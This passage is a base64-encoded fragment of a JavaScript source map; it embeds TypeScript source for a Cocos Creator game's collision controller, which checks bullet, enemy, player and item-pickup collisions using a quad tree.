cUJBQ25IO3lCQUFLO3dCQUNGLFFBQVEsR0FBRyxFQUFFLENBQUMsWUFBWSxDQUFDLGFBQWEsQ0FBQyxJQUFJLENBQUMsUUFBUSxDQUFDLEtBQUssQ0FBQyxNQUFNLEVBQUUsa0JBQWtCLENBQUMsSUFBSSxDQUFDLG1CQUFtQixDQUFDLEtBQUssQ0FBQyxDQUFDO3FCQUMzSDtvQkFDRCxJQUFJLFFBQVEsRUFBQzt3QkFDVCxtQ0FBbUM7d0JBQ25DLElBQUksQ0FBQyxPQUFPLEVBQUUsQ0FBQztxQkFDbEI7aUJBQ0o7YUFDSjtRQUNMLENBQUMsQ0FBQyxDQUFDO0lBQ1AsQ0FBQzs7SUExT0Q7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLElBQUksQ0FBQztxRUFDYztJQUdoQztRQURDLFFBQVEsQ0FBQyx1QkFBYSxDQUFDO2tFQUNXO0lBTGxCLHVCQUF1QjtRQUQzQyxPQUFPO09BQ2EsdUJBQXVCLENBOE8zQztJQUFELDhCQUFDO0NBOU9ELEFBOE9DLENBOU9vRCxFQUFFLENBQUMsU0FBUyxHQThPaEU7a0JBOU9vQix1QkFBdUIiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuXHJcbmltcG9ydCBMb29zZVF1YWRUcmVlIGZyb20gXCIuLi8uLi9xdWFkLXRyZWUvTG9vc2VRdWFkVHJlZVwiO1xyXG5pbXBvcnQgQUFCQlJlZ2lvbiBmcm9tIFwiLi4vLi4vcXVhZC10cmVlL0FBQkJSZWdpb25cIjtcclxuaW1wb3J0IEVuZW15QUFCQiBmcm9tIFwiLi4vZW50aXRpZXMvZW5lbXkvRW5lbXlBQUJCXCI7XHJcbmltcG9ydCB7R2FtZVByb3h5fSBmcm9tIFwiLi9HYW1lUHJveHlcIjtcclxuaW1wb3J0IEJ1bGxldE9mRW5lbXkgZnJvbSBcIi4uL2VudGl0aWVzL2J1bGxldC9CdWxsZXRPZkVuZW15XCI7XHJcbmltcG9ydCBQcm9wQmFzZSBmcm9tIFwiLi4vZW50aXRpZXMvcHJvcC9Qcm9wQmFzZVwiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5jb25zdCBtYXRoID0gY2MubWF0aDtcclxuXHJcbmxldCBfdmVjMiA9IGNjLnYyKCk7XHJcblxyXG5mdW5jdGlvbiBvYmJBcHBseU1hdHJpeCAocmVjdCwgbWF0NCwgb3V0X2JsLCBvdXRfdGwsIG91dF90ciwgb3V0X2JyKSB7XHJcbiAgICB2YXIgeCA9IHJlY3QueDtcclxuICAgIHZhciB5ID0gcmVjdC55O1xyXG4gICAgdmFyIHdpZHRoID0gcmVjdC53aWR0aDtcclxuICAgIHZhciBoZWlnaHQgPSByZWN0LmhlaWdodDtcclxuXHJcbiAgICB2YXIgbTAwID0gbWF0NC5tMCwgbTAxID0gbWF0NC5tMSwgbTA0ID0gbWF0NC5tNCwgbTA1ID0gbWF0NC5tNTtcclxuICAgIHZhciBtMTIgPSBtYXQ0Lm0xMiwgbTEzID0gbWF0NC5tMTM7XHJcblxyXG4gICAgdmFyIHR4ID0gbTAwICogeCArIG0wNCAqIHkgKyBtMTI7XHJcbiAgICB2YXIgdHkgPSBtMDEgKiB4ICsgbTA1ICogeSArIG0xMztcclxuICAgIHZhciB4YSA9IG0wMCAqIHdpZHRoO1xyXG4gICAgdmFyIHhiID0gbTAxICogd2lkdGg7XHJcbiAgICB2YXIgeWMgPSBtMDQgKiBoZWlnaHQ7XHJcbiAgICB2YXIgeWQgPSBtMDUgKiBoZWlnaHQ7XHJcblxyXG4gICAgb3V0X3RsLnggPSB0eDtcclxuICAgIG91dF90bC55ID0gdHk7XHJcbiAgICBvdXRfdHIueCA9IHhhICsgdHg7XHJcbiAgICBvdXRfdHIueSA9IHhiICsgdHk7XHJcbiAgICBvdXRfYmwueCA9IHljICsgdHg7XHJcbiAgICBvdXRfYmwueSA9IHlkICsgdHk7XHJcbiAgICBvdXRfYnIueCA9IHhhICsgeWMgKyB0eDtcclxuICAgIG91dF9ici55ID0geGIgKyB5ZCArIHR5O1xyXG59O1xyXG5cclxuQGNjY2xhc3NcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgR2FtZUNvbGxpc2lvbkNvbnRyb2xsZXIgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICBlbmVteUJ1bGxldExheWVyOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShMb29zZVF1YWRUcmVlKVxyXG4gICAgbG9vc2VRdWFkVHJlZTpMb29zZVF1YWRUcmVlID0gbnVsbDtcclxuXHJcblxyXG5cclxuICAgIG9uTG9hZCgpe1xyXG4gICAgICAgIHdpbmRvd1snR2FtZUNvbGxpc2lvbkNvbnRyb2xsZXInXSA9IHRoaXM7XHJcbiAgICB9XHJcblxyXG4gICAgc3RhdGljIHVwZGF0ZUNvbGxpZGVyIChjb2xsaWRlcikge1xyXG4gICAgICAgIGxldCBvZmZzZXQgPSBjb2xsaWRlci5vZmZzZXQ7XHJcbiAgICAgICAgbGV0IHdvcmxkID0gY29sbGlkZXIud29ybGQ7XHJcbiAgICAgICAgbGV0IGFhYmIgPSB3b3JsZC5hYWJiO1xyXG5cclxuICAgICAgICBsZXQgbSA9IHdvcmxkLm1hdHJpeDtcclxuICAgICAgICBjb2xsaWRlci5ub2RlLmdldExvY2FsTWF0cml4KG0pO1xyXG5cclxuICAgICAgICBsZXQgcHJlQWFiYiA9IHdvcmxkLnByZUFhYmI7XHJcbiAgICAgICAgcHJlQWFiYi54ID0gYWFiYi54O1xyXG4gICAgICAgIHByZUFhYmIueSA9IGFhYmIueTtcclxuICAgICAgICBwcmVBYWJiLndpZHRoID0gYWFiYi53aWR0aDtcclxuICAgICAgICBwcmVBYWJiLmhlaWdodCA9IGFhYmIuaGVpZ2h0O1xyXG5cclxuICAgICAgICBpZiAoY29sbGlkZXIgaW5zdGFuY2VvZiBjYy5Cb3hDb2xsaWRlcikge1xyXG4gICAgICAgICAgICBsZXQgc2l6ZSA9IGNvbGxpZGVyLnNpemU7XHJcblxyXG4gICAgICAgICAgICBhYWJiLnggPSBvZmZzZXQueCAtIHNpemUud2lkdGgvMjtcclxuICAgICAgICAgICAgYWFiYi55ID0gb2Zmc2V0LnkgLSBzaXplLmhlaWdodC8yO1xyXG4gICAgICAgICAgICBhYWJiLndpZHRoID0gc2l6ZS53aWR0aDtcclxuICAgICAgICAgICAgYWFiYi5oZWlnaHQgPSBzaXplLmhlaWdodDtcclxuXHJcbiAgICAgICAgICAgIGxldCB3cHMgPSB3b3JsZC5wb2ludHM7XHJcbiAgICAgICAgICAgIGxldCB3cDAgPSB3cHNbMF0sIHdwMSA9IHdwc1sxXSxcclxuICAgICAgICAgICAgICAgIHdwMiA9IHdwc1syXSwgd3AzID0gd3BzWzNdO1xyXG4gICAgICAgICAgICBvYmJBcHBseU1hdHJpeChhYWJiLCBtLCB3cDAsIHdwMSwgd3AyLCB3cDMpO1xyXG5cclxuICAgICAgICAgICAgbGV0IG1pbnggPSBNYXRoLm1pbih3cDAueCwgd3AxLngsIHdwMi54LCB3cDMueCk7XHJcbiAgICAgICAgICAgIGxldCBtaW55ID0gTWF0aC5taW4od3AwLnksIHdwMS55LCB3cDIueSwgd3AzLnkpO1xyXG4gICAgICAgICAgICBsZXQgbWF4eCA9IE1hdGgubWF4KHdwMC54LCB3cDEueCwgd3AyLngsIHdwMy54KTtcclxuICAgICAgICAgICAgbGV0IG1heHkgPSBNYXRoLm1heCh3cDAueSwgd3AxLnksIHdwMi55LCB3cDMueSk7XHJcblxyXG4gICAgICAgICAgICBhYWJiLnggPSBtaW54O1xyXG4gICAgICAgICAgICBhYWJiLnkgPSBtaW55O1xyXG4gICAgICAgICAgICBhYWJiLndpZHRoID0gbWF4eCAtIG1pbng7XHJcbiAgICAgICAgICAgIGFhYmIuaGVpZ2h0ID0gbWF4eSAtIG1pbnk7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGVsc2UgaWYgKGNvbGxpZGVyIGluc3RhbmNlb2YgY2MuQ2lyY2xlQ29sbGlkZXIpIHtcclxuICAgICAgICAgICAgLy8gY2FsY3VsYXRlIHdvcmxkIHBvc2l0aW9uXHJcbiAgICAgICAgICAgIG1hdGguVmVjMi50cmFuc2Zvcm1NYXQ0KF92ZWMyLCBjb2xsaWRlci5vZmZzZXQsIG0pO1xyXG5cclxuICAgICAgICAgICAgd29ybGQucG9zaXRpb24ueCA9IF92ZWMyLng7XHJcbiAgICAgICAgICAgIHdvcmxkLnBvc2l0aW9uLnkgPSBfdmVjMi55O1xyXG5cclxuICAgICAgICAgICAgLy8gY2FsY3VsYXRlIHdvcmxkIHJhZGl1c1xyXG4gICAgICAgICAgICBsZXQgdGVtcHggPSBtLm0xMiwgdGVtcHkgPSBtLm0xMztcclxuICAgICAgICAgICAgbS5tMTIgPSBtLm0xMyA9IDA7XHJcblxyXG4gICAgICAgICAgICBfdmVjMi54ID0gY29sbGlkZXIucmFkaXVzO1xyXG4gICAgICAgICAgICBfdmVjMi55ID0gMDtcclxuXHJcbiAgICAgICAgICAgIG1hdGguVmVjMi50cmFuc2Zvcm1NYXQ0KF92ZWMyLCBfdmVjMiwgbSk7XHJcbiAgICAgICAgICAgIGxldCBkID0gTWF0aC5zcXJ0KF92ZWMyLnggKiBfdmVjMi54ICsgX3ZlYzIueSAqIF92ZWMyLnkpO1xyXG5cclxuICAgICAgICAgICAgd29ybGQucmFkaXVzID0gZDtcclxuXHJcbiAgICAgICAgICAgIGFhYmIueCA9IHdvcmxkLnBvc2l0aW9uLnggLSBkO1xyXG4gICAgICAgICAgICBhYWJiLnkgPSB3b3JsZC5wb3NpdGlvbi55IC0gZDtcclxuICAgICAgICAgICAgYWFiYi53aWR0aCA9IGQgKiAyO1xyXG4gICAgICAgICAgICBhYWJiLmhlaWdodCA9IGQgKiAyO1xyXG5cclxuICAgICAgICAgICAgbS5tMTIgPSB0ZW1weDtcclxuICAgICAgICAgICAgbS5tMTMgPSB0ZW1weTtcclxuICAgICAgICB9XHJcbiAgICAgICAgZWxzZSBpZiAoY29sbGlkZXIgaW5zdGFuY2VvZiBjYy5Qb2x5Z29uQ29sbGlkZXIpIHtcclxuICAgICAgICAgICAgbGV0IHBvaW50cyA9IGNvbGxpZGVyLnBvaW50cztcclxuICAgICAgICAgICAgbGV0IHdvcmxkUG9pbnRzID0gd29ybGQucG9pbnRzO1xyXG5cclxuICAgICAgICAgICAgd29ybGRQb2ludHMubGVuZ3RoID0gcG9pbnRzLmxlbmd0aDtcclxuXHJcbiAgICAgICAgICAgIGxldCBtaW54ID0gMWU2LCBtaW55ID0gMWU2LCBtYXh4ID0gLTFlNiwgbWF4eSA9IC0xZTY7XHJcbiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwLCBsID0gcG9pbnRzLmxlbmd0aDsgaSA8IGw7IGkrKykge1xyXG4gICAgICAgICAgICAgICAgaWYgKCF3b3JsZFBvaW50c1tpXSkge1xyXG4gICAgICAgICAgICAgICAgICAgIHdvcmxkUG9pbnRzW2ldID0gY2MudjIoKTtcclxuICAgICAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAgICAgICBfdmVjMi54ID0gcG9pbnRzW2ldLnggKyBvZmZzZXQueDtcclxuICAgICAgICAgICAgICAgIF92ZWMyLnkgPSBwb2ludHNbaV0ueSArIG9mZnNldC55O1xyXG5cclxuICAgICAgICAgICAgICAgIG1hdGguVmVjMi50cmFuc2Zvcm1NYXQ0KF92ZWMyLCBfdmVjMiwgbSk7XHJcblxyXG4gICAgICAgICAgICAgICAgbGV0IHggPSBfdmVjMi54O1xyXG4gICAgICAgICAgICAgICAgbGV0IHkgPSBfdmVjMi55O1xyXG5cclxuICAgICAgICAgICAgICAgIHdvcmxkUG9pbnRzW2ldLnggPSB4O1xyXG4gICAgICAgICAgICAgICAgd29ybGRQb2ludHNbaV0ueSA9IHk7XHJcblxyXG4gICAgICAgICAgICAgICAgaWYgKHggPiBtYXh4KSBtYXh4ID0geDtcclxuICAgICAgICAgICAgICAgIGlmICh4IDwgbWlueCkgbWlueCA9IHg7XHJcbiAgICAgICAgICAgICAgICBpZiAoeSA+IG1heHkpIG1heHkgPSB5O1xyXG4gICAgICAgICAgICAgICAgaWYgKHkgPCBtaW55KSBtaW55ID0geTtcclxuICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgYWFiYi54ID0gbWlueDtcclxuICAgICAgICAgICAgYWFiYi55ID0gbWlueTtcclxuICAgICAgICAgICAgYWFiYi53aWR0aCA9IG1heHggLSBtaW54O1xyXG4gICAgICAgICAgICBhYWJiLmhlaWdodCA9IG1heHkgLSBtaW55O1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBwcml2YXRlIF91cGRhdGVDb2xsaWRlcnM6QXJyYXk8QUFCQlJlZ2lvbj4gPSBbXTtcclxuXHJcbiAgICB1cGRhdGUoZHQ6bnVtYmVyKXtcclxuICAgICAgICBpZiAoR2FtZVByb3h5LnBhdXNlR2FtZSlyZXR1cm47XHJcbiAgICAgICAgdGhpcy5sb29zZVF1YWRUcmVlLnVwZGF0ZUFsbCgpO1xyXG4gICAgICAgIHRoaXMuX3VwZGF0ZUNvbGxpZGVycy5mb3JFYWNoKHZhbHVlID0+IHZhbHVlLmJVcGRhdGVDb2xsaWRlciA9IGZhbHNlKTtcclxuICAgICAgICB0aGlzLl91cGRhdGVDb2xsaWRlcnMubGVuZ3RoID0gMDtcclxuICAgICAgICBsZXQgZ2FtZUJ1bGxldHNDb250cm9sbGVyID0gd2luZG93WydHYW1lQnVsbGV0c0NvbnRyb2xsZXInXTtcclxuICAgICAgICAvKiog5LiO5pWM5Lq655qE56Kw5pKeICovXHJcbiAgICAgICAgLyoqIOWtkOW8ueWSjOWFtuS7lueIhueCuOeJqSAqL1xyXG4gICAgICAgIGxldCBlbmVteUNvbnRhY3RzID0gZ2FtZUJ1bGxldHNDb250cm9sbGVyLnJvbGVCdWxsZXRzO1xyXG4gICAgICAgIGZvciAobGV0IGVuZW15Q29udGFjdCBvZiBlbmVteUNvbnRhY3RzKXtcclxuICAgICAgICAgICAgaWYgKGVuZW15Q29udGFjdC5jb2xsaWRlci5lbmFibGVkKXtcclxuICAgICAgICAgICAgICAgIEdhbWVDb2xsaXNpb25Db250cm9sbGVyLnVwZGF0ZUNvbGxpZGVyKGVuZW15Q29udGFjdC5jb2xsaWRlcik7XHJcbiAgICAgICAgICAgICAgICAvKiog6I635Y+W5Y+v6IO95Y+R55Sf56Kw5pKe55qE5pWM5Lq6ICovXHJcbiAgICAgICAgICAgICAgICBsZXQgYXJyID0gW107XHJcbiAgICAgICAgICAgICAgICB0aGlzLmxvb3NlUXVhZFRyZWUucmV0cmlldmUoZW5lbXlDb250YWN0LmNvbGxpZGVyLndvcmxkLmFhYmIsIGFycik7XHJcbiAgICAgICAgICAgICAgICBmb3IgKGxldCBhYWJiUmVnaW9uIG9mIGFycil7XHJcbiAgICAgICAgICAgICAgICAgICAgbGV0IGVuZW15ID0gKDxFbmVteUFBQkI+YWFiYlJlZ2lvbikuZW5lbXk7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKCFhYWJiUmVnaW9uLmJVcGRhdGVDb2xsaWRlcil7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIEdhbWVDb2xsaXNpb25Db250cm9sbGVyLnVwZGF0ZUNvbGxpZGVyKGVuZW15LnNwYWNlQ2lyY2xlQ29sbGlkZXIpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBHYW1lQ29sbGlzaW9uQ29udHJvbGxlci51cGRhdGVDb2xsaWRlcihlbmVteS5kZWZlbmNlQm94Q29sbGlkZXIpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBhYWJiUmVnaW9uLmJVcGRhdGVDb2xsaWRlciA9IHRydWU7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHRoaXMuX3VwZGF0ZUNvbGxpZGVycy5wdXNoKGFhYmJSZWdpb24pO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICBsZXQgYkNvbnRhY3QgPSBmYWxzZTtcclxuICAgICAgICAgICAgICAgICAgICBpZiAoZW5lbXlDb250YWN0LmNvbGxpZGVyIGluc3RhbmNlb2YgY2MuQ2lyY2xlQ29sbGlkZXIpe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBiQ29udGFjdCA9IGNjLkludGVyc2VjdGlvbi5wb2x5Z29uQ2lyY2xlKGVuZW15LmRlZmVuY2VCb3hDb2xsaWRlci53b3JsZC5wb2ludHMsIGVuZW15Q29udGFjdC5jb2xsaWRlci53b3JsZCk7XHJcbiAgICAgICAgICAgICAgICAgICAgfWVsc2Uge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBiQ29udGFjdCA9IGNjLkludGVyc2VjdGlvbi5wb2x5Z29uUG9seWdvbihlbmVteS5kZWZlbmNlQm94Q29sbGlkZXIud29ybGQucG9pbnRzLCBlbmVteUNvbnRhY3QuY29sbGlkZXIud29ybGQucG9pbnRzKTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKGJDb250YWN0KXtcclxuICAgICAgICAgICAgICAgICAgICAgICAgLy8gY29uc29sZS5sb2coXCI9PT09PT09PT7kuqfnlJ/kuobnorDmkp4uLlwiKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFlbmVteUNvbnRhY3QuY29udGFjdHMuaW5jbHVkZXMoZW5lbXkpKXtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIGNvbnNvbGUubG9nKFwiPT09PT09PT5vbkNvbGxpc2lvbkVudGVyXCIpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5lbXlDb250YWN0LmNvbnRhY3RzLnB1c2goZW5lbXkpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5lbXlDb250YWN0Lm9uQ29sbGlzaW9uRW50ZXIoZW5lbXkuZGVmZW5jZUJveENvbGxpZGVyLCBlbmVteUNvbnRhY3QuY29sbGlkZXIpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoIWVuZW15Q29udGFjdC5iVGhyb3VnaHQpYnJlYWs7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH1lbHNlIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIGNvbnNvbGUubG9nKFwiPT09PT09PT0+b25Db2xsaXNpb25TdGF5XCIpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5lbXlDb250YWN0Lm9uQ29sbGlzaW9uU3RheShlbmVteS5kZWZlbmNlQm94Q29sbGlkZXIsIGVuZW15Q29udGFjdC5jb2xsaWRlcik7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBpbmRleCA9IGVuZW15Q29udGFjdC5jb250YWN0cy5pbmRleE9mKGVuZW15KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGluZGV4ID49IDApe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5lbXlDb250YWN0LmNvbnRhY3RzLnNwbGljZShpbmRleCwgMSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmVteUNvbnRhY3Qub25Db2xsaXNpb25FeGl0KGVuZW15LmRlZmVuY2VCb3hDb2xsaWRlciwgZW5lbXlDb250YWN0LmNvbGxpZGVyKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgbGV0IGdhbWVSb2xlQ29udHJvbGxlciA9IHdpbmRvd1snR2FtZVJvbGVDb250cm9sbGVyJ107XHJcblxyXG4gICAgICAgIC8qKiDkuI7op5LoibLnmoTnorDmkp4gKi9cclxuICAgICAgICBsZXQgYlJvbGVVcGRhdGVDb2xsaWRlciA9IGZhbHNlO1xyXG4gICAgICAgIC8qKiDmlYzkurrnmoTlrZDlvLkgKi9cclxuICAgICAgICBnYW1lQnVsbGV0c0NvbnRyb2xsZXIuZW5lbXlCdWxsZXRzLmZvckVhY2goYnVsbGV0ID0+IHtcclxuICAgICAgICAgICAgLyoqIOWFiOi/h+a7pOaOieS4gOS6m+avlOi+g+i/nOeahCAqL1xyXG4gICAgICAgICAgICBpZiAoYnVsbGV0Lm5vZGUucG9zaXRpb24uc3ViKGdhbWVSb2xlQ29udHJvbGxlci5yb2xlLm5vZGUucG9zaXRpb24pLm1hZygpIDwgTWF0aC5tYXgoYnVsbGV0Lm5vZGUud2lkdGgsIGJ1bGxldC5ub2RlLmhlaWdodCkgKyBnYW1lUm9sZUNvbnRyb2xsZXIucm9sZS5zcGFjZUNpcmNsZUNvbGxpZGVyLnJhZGl1cyl7XHJcbiAgICAgICAgICAgICAgICAvKiog57K+5a+G5Yik5patICovXHJcbiAgICAgICAgICAgICAgICBHYW1lQ29sbGlzaW9uQ29udHJvbGxlci51cGRhdGVDb2xsaWRlcihidWxsZXQuY29sbGlkZXIpO1xyXG4gICAgICAgICAgICAgICAgaWYgKCFiUm9sZVVwZGF0ZUNvbGxpZGVyKXtcclxuICAgICAgICAgICAgICAgICAgICBHYW1lQ29sbGlzaW9uQ29udHJvbGxlci51cGRhdGVDb2xsaWRlcihnYW1lUm9sZUNvbnRyb2xsZXIucm9sZS5zcGFjZUNpcmNsZUNvbGxpZGVyKTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIC8qKiDliKTmlq3lnIblvaLkuI7lpJrovrnlvaLnmoTnorDmkp4gKi9cclxuICAgICAgICAgICAgICAgIGxldCBiQ29udGFjdCA9IGZhbHNlO1xyXG4gICAgICAgICAgICAgICAgaWYgKGJ1bGxldC5jb2xsaWRlciBpbnN0YW5jZW9mIGNjLkNpcmNsZUNvbGxpZGVyKXtcclxuICAgICAgICAgICAgICAgICAgICBiQ29udGFjdCA9IGNjLkludGVyc2VjdGlvbi5jaXJjbGVDaXJjbGUoYnVsbGV0LmNvbGxpZGVyLndvcmxkLCBnYW1lUm9sZUNvbnRyb2xsZXIucm9sZS5zcGFjZUNpcmNsZUNvbGxpZGVyLndvcmxkKTtcclxuICAgICAgICAgICAgICAgIH1lbHNlIHtcclxuICAgICAgICAgICAgICAgICAgICBiQ29udGFjdCA9IGNjLkludGVyc2VjdGlvbi5wb2x5Z29uQ2lyY2xlKGJ1bGxldC5jb2xsaWRlci53b3JsZC5wb2ludHMsIGdhbWVSb2xlQ29udHJvbGxlci5yb2xlLnNwYWNlQ2lyY2xlQ29sbGlkZXIud29ybGQpO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgaWYgKGJDb250YWN0KXtcclxuICAgICAgICAgICAgICAgICAgICAvLyBjb25zb2xlLmxvZyhcIj09PT09PT09PuS6p+eUn+S6hueisOaSni4uXCIpO1xyXG4gICAgICAgICAgICAgICAgICAgIGlmICghYnVsbGV0LmNvbnRhY3RzLmluY2x1ZGVzKGdhbWVSb2xlQ29udHJvbGxlci5yb2xlKSl7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIC8vIGNvbnNvbGUubG9nKFwiPT09PT09PT5vbkNvbGxpc2lvbkVudGVyXCIpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBidWxsZXQuY29udGFjdHMucHVzaChnYW1lUm9sZUNvbnRyb2xsZXIucm9sZSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGJ1bGxldC5vbkNvbGxpc2lvbkVudGVyKGdhbWVSb2xlQ29udHJvbGxlci5yb2xlLnNwYWNlQ2lyY2xlQ29sbGlkZXIsIGJ1bGxldC5jb2xsaWRlcik7XHJcbiAgICAgICAgICAgICAgICAgICAgfWVsc2Uge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAvLyBjb25zb2xlLmxvZyhcIj09PT09PT09Pm9uQ29sbGlzaW9uU3RheVwiKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0Lm9uQ29sbGlzaW9uU3RheShnYW1lUm9sZUNvbnRyb2xsZXIucm9sZS5zcGFjZUNpcmNsZUNvbGxpZGVyLCBidWxsZXQuY29sbGlkZXIpO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH1lbHNlIHtcclxuICAgICAgICAgICAgICAgICAgICBsZXQgaW5kZXggPSBidWxsZXQuY29udGFjdHMuaW5kZXhPZihnYW1lUm9sZUNvbnRyb2xsZXIucm9sZSk7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKGluZGV4ID49IDApe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBidWxsZXQuY29udGFjdHMuc3BsaWNlKGluZGV4LCAxKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgYnVsbGV0Lm9uQ29sbGlzaW9uRXhpdChnYW1lUm9sZUNvbnRyb2xsZXIucm9sZS5zcGFjZUNpcmNsZUNvbGxpZGVyLCBidWxsZXQuY29sbGlkZXIpO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH0pO1xyXG5cclxuICAgICAgICAvKiog6YGT5YW3ICovXHJcbiAgICAgICAgd2luZG93WydHYW1lRW5lbXlzQ29udHJvbGxlciddLmdhbWVQcm9wcy5mb3JFYWNoKHByb3AgPT4ge1xyXG4gICAgICAgICAgICBpZiAoIXByb3Aub25fb2ZmKXtcclxuICAgICAgICAgICAgICAgIGxldCBkaXN0YW5jZSA9IHByb3Aubm9kZS5wb3NpdGlvbi5zdWIoZ2FtZVJvbGVDb250cm9sbGVyLnJvbGUubm9kZS5wb3NpdGlvbikubWFnKCk7XHJcbiAgICAgICAgICAgICAgICBpZiAoR2FtZVByb3h5Lm1hZ25ldGljICYmICFwcm9wLm1hZ25ldGljKXtcclxuICAgICAgICAgICAgICAgICAgICBpZiAoZGlzdGFuY2UgPCAxMDApe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBwcm9wLm1hZ25ldGljID0gdHJ1ZTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBpZiAoZGlzdGFuY2UgPCBNYXRoLm1heChwcm9wLm5vZGUud2lkdGgsIHByb3Aubm9kZS5oZWlnaHQpICsgZ2FtZVJvbGVDb250cm9sbGVyLnJvbGUuc3BhY2VDaXJjbGVDb2xsaWRlci5yYWRpdXMpe1xyXG4gICAgICAgICAgICAgICAgICAgIC8qKiDnsr7lr4bliKTmlq0gKi9cclxuICAgICAgICAgICAgICAgICAgICBHYW1lQ29sbGlzaW9uQ29udHJvbGxlci51cGRhdGVDb2xsaWRlcihwcm9wLmNvbGxpZGVyKTtcclxuICAgICAgICAgICAgICAgICAgICBpZiAoIWJSb2xlVXBkYXRlQ29sbGlkZXIpe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBHYW1lQ29sbGlzaW9uQ29udHJvbGxlci51cGRhdGVDb2xsaWRlcihnYW1lUm9sZUNvbnRyb2xsZXIucm9sZS5zcGFjZUNpcmNsZUNvbGxpZGVyKTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICAgICAgICAgIC8qKiDliKTmlq3lnIblvaLkuI7lpJrovrnlvaLnmoTnorDmkp4gKi9cclxuICAgICAgICAgICAgICAgICAgICBsZXQgYkNvbnRhY3QgPSBmYWxzZTtcclxuICAgICAgICAgICAgICAgICAgICBpZiAocHJvcC5jb2xsaWRlciBpbnN0YW5jZW9mIGNjLkNpcmNsZUNvbGxpZGVyKXtcclxuICAgICAgICAgICAgICAgICAgICAgICAgYkNvbnRhY3QgPSBjYy5JbnRlcnNlY3Rpb24uY2lyY2xlQ2lyY2xlKHByb3AuY29sbGlkZXIud29ybGQsIGdhbWVSb2xlQ29udHJvbGxlci5yb2xlLnNwYWNlQ2lyY2xlQ29sbGlkZXIud29ybGQpO1xyXG4gICAgICAgICAgICAgICAgICAgIH1lbHNlIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgYkNvbnRhY3QgPSBjYy5JbnRlcnNlY3Rpb24ucG9seWdvbkNpcmNsZShwcm9wLmNvbGxpZGVyLndvcmxkLnBvaW50cywgZ2FtZVJvbGVDb250cm9sbGVyLnJvbGUuc3BhY2VDaXJjbGVDb2xsaWRlci53b3JsZCk7XHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgIGlmIChiQ29udGFjdCl7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIC8vIGNvbnNvbGUubG9nKFwiPT09PT09PT0+5Lqn55Sf5LqG56Kw5pKeLi5cIik7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHByb3AudHJpZ2dlcigpO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG5cclxufVxyXG4iXX0=
